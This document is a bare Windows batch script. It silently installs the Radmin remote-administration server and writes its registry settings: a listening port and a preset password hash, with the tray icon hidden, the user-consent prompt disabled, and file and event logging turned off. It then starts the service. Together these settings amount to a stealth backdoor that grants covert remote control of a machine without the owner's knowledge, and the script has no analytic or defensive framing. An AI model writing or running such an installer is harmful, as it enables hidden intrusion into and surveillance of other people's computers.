r_server.exe /install /silence
echo off
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters
dtREG -AddKey HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\iplist
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Port=22130000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Timeout=0a000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableLogFile=00000000
dtREG -Set REG_SZ HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\LogFilePath="c:\logfile.txt"
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\FilterIp=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\DisableTrayIcon=01000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\AutoAllow=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\AskUser=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\EnableEventLog=00000000
dtREG -Set REG_BINARY HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter=a3729aba72a15e43c1478d351d658987
echo off
net start r_server